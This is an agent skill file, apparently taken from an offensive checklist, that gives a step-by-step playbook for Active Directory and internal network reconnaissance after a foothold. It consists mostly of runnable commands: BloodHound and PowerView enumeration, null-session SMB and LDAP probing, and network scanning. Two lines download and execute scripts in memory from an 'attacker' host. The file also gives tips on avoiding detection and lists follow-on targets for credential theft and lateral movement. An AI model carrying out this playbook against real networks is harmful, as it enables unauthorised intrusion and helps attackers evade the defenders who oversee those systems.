---
name: offensive-internal-recon
description: "Internal network and Active Directory reconnaissance — BloodHound collection (SharpHound, bloodhound-python, AzureHound), PowerView enumeration without binaries, ADExplorer offline snapshots, RPC and SMB null-session enumeration, LDAP queries (anonymous and authenticated), DNS service-record harvesting, and network scanning with proper noise levels. Use as the first step after assumed-breach foothold to map the AD/internal environment before attempting credential, lateral, or escalation actions."
---

# Internal / AD Reconnaissance

You're inside the perimeter (assumed-breach, phishing-landing, vendor laptop). Before exploitation, map the domain and the network — spending 30 minutes here saves hours of misdirected attacks.

## Quick Workflow

1. Identify domain, DCs, current user, current host
2. Take BloodHound snapshot (offline analysis preferred)
3. Enumerate group memberships, ACLs, Kerberos delegations, SPN-bearing accounts
4. Capture an ADExplorer snapshot for deep offline analysis
5. Build target list before any active credential attack

---

## Identify the Environment

```powershell
# Current context
whoami /all
nltest /dsgetdc:corp.local
nltest /dclist:corp.local

# Domain
$d = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$f = $d.Forest
echo "Domain: $($d.Name); Forest: $($f.Name)"

# DCs via DNS SRV
nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local
```

```bash
# From Linux foothold
nmblookup -A 10.0.0.5
nxc smb 10.0.0.5
ldapsearch -x -H ldap://dc -s base -b "" "(objectclass=*)" namingContexts
```

## BloodHound Collection

### SharpHound (CSharp, in-memory or on-disk)

```powershell
# Most stealth-friendly
SharpHound.exe -c All,GPOLocalGroup --Throttle 1000 --Jitter 30 --ZipFileName recon.zip

# DC-only (avoids workstation noise)
SharpHound.exe -c DCOnly --Stealth

# In-memory (no disk write)
IEX(New-Object Net.WebClient).DownloadString('http://attacker/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Temp
```

### bloodhound-python (Linux)

```bash
bloodhound-python -d corp.local -u user -p pass -ns 10.0.0.1 -c All --zip
# Outputs JSON files; import to BloodHound GUI
```

### Throttling Trade-offs

| Throttle | Detection Risk |
|---|---|
| 0 (no throttle) | Fast; trivially detected by behavioral analytics |
| 1000ms / 30% jitter | Medium; reasonable for assumed-breach |
| Stealth mode | Slowest; only DC queries, no workstation enumeration |

For sensitive engagements, prefer `Stealth` + `DCOnly` initial pass; expand selectively.

## PowerView (No Binaries Needed)

```powershell
# Load PowerView
IEX(New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')

# Quick wins
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname    # Kerberoast candidates
Get-DomainUser -PreauthNotRequired                                  # ASREProast candidates
Get-DomainComputer -Unconstrained                                   # Unconstrained delegation
Get-DomainGPO -Properties displayname,gpcfilesyspath
Get-DomainOU -Properties name,gplink

# Find ACL-abuse opportunities
Get-DomainObjectAcl -SearchBase 'CN=Domain Admins,...' -ResolveGUIDs |
  ?{ $_.ActiveDirectoryRights -match 'WriteDacl|GenericAll|WriteOwner' }

# Local admin via GPO local group / RSoP
Find-LocalAdminAccess
```

## ADExplorer Snapshot

ADExplorer (Sysinternals) takes a full LDAP snapshot. Run as a low-priv user (any domain user can read most attributes):

```
ADExplorer.exe → File → Create Snapshot → save .dat file
```

Convert for BloodHound offline:

```bash
ADExplorerSnapshot.py snapshot.dat -o output/
# Imports as a BloodHound-compatible dataset for analysis without further AD queries
```

This is the lowest-noise BloodHound collection — one LDAP query session, then unlimited offline analysis.

## SMB / Null Session

```bash
# Anonymous LDAP
ldapsearch -x -H ldap://dc -s base -b ""
nxc ldap dc -u '' -p '' --users

# Null SMB session
nxc smb dc -u '' -p '' --shares
nxc smb dc -u '' -p '' --pass-pol
impacket-rpcclient -U '' dc -no-pass

# After credentials obtained
nxc smb 10.0.0.0/24 -u user -p pass --shares
nxc smb 10.0.0.0/24 -u user -p pass --loggedon-users
nxc smb 10.0.0.0/24 -u user -p pass --pass-pol
```

## DNS / Service Records

```bash
# DCs and services via DNS SRV
nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local
nslookup -type=SRV _kerberos._tcp.corp.local
nslookup -type=SRV _gc._tcp.corp.local       # global catalog

# Reverse DNS for known IP space
for ip in $(seq 1 254); do
  host 10.0.0.$ip
done | grep -v "not found"
```

## Trusts (Forest / Domain)

```powershell
# Map trusts
Get-DomainTrust
Get-ForestTrust
Get-DomainTrust -SearchBase "DC=corp,DC=local"

# Cross-trust user enumeration
Get-DomainUser -Domain partner.com
```

```bash
# Linux equivalent
nltest-ish via ldapsearch:
ldapsearch -x -H ldap://dc -b "CN=System,DC=corp,DC=local" "(objectclass=trustedDomain)"
```

## Network Scanning

```bash
# Quiet host discovery
nmap -sn -PE -PP -PS21,22,80,443,445,3389,5985 10.0.0.0/24 -oA hostsweep

# Layer-2 (most reliable in same broadcast domain)
sudo netdiscover -i eth0 -r 10.0.0.0/24 -P

# Service enum on alive hosts
nmap -sV -sC -p- --min-rate 2000 -iL alive_hosts.txt -oA services
```

## Build the Target List

After recon, you should have:

| Asset | Source | Use |
|---|---|---|
| Domain Controllers | DNS SRV / nltest | Auth, Kerberos, DCSync targets |
| Privileged accounts | BloodHound + PowerView | Kerberoast, ACL abuse targets |
| Computer accounts (admins on other systems) | BloodHound | Lateral movement targets |
| ADCS CAs and templates | certipy / Get-DomainObject | ESC1-15 candidates |
| Coercion targets (DCs, file servers) | nxc / printer enum | PetitPotam, PrinterBug |
| Open shares | nxc --shares | Data discovery |
| Out-of-domain assets (Linux, network gear) | nmap | Cross-platform pivot |

## Engagement Cheatsheet

```bash
# 1. Identify
whoami /all
nltest /dsgetdc:corp.local

# 2. BloodHound stealth pass
SharpHound.exe -c DCOnly --Stealth

# 3. ADExplorer offline snapshot
# (Run from Windows host; copy .dat off, analyze offline)

# 4. Anonymous + authed enum
nxc smb 10.0.0.0/24 -u '' -p ''
nxc ldap dc -u user -p pass --users

# 5. Network sweep (low rate)
sudo nmap -sS -p 22,80,443,445,3389,5985 10.0.0.0/24 --min-rate 200

# 6. Build target list before active credential attacks
```

## Detection Considerations

| Signal | Defender View |
|---|---|
| Bulk LDAP queries | MDI / Defender for Identity flags reconnaissance via SAMR |
| SharpHound default speed | Behavioral analytics on auth volume |
| Nmap on internal | NIDS rule on port-scan |
| Repeated null-session attempts | DC event log entries |

`SharpHound -c DCOnly --Stealth` and ADExplorer offline analysis are the quietest paths.

---

## Key References

- BloodHound documentation: bloodhound.specterops.io
- PowerView: github.com/PowerShellMafia/PowerSploit/tree/master/Recon
- ADExplorer: docs.microsoft.com/sysinternals
- "The Hacker Recipes" — internal recon section
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/internal-recon.md
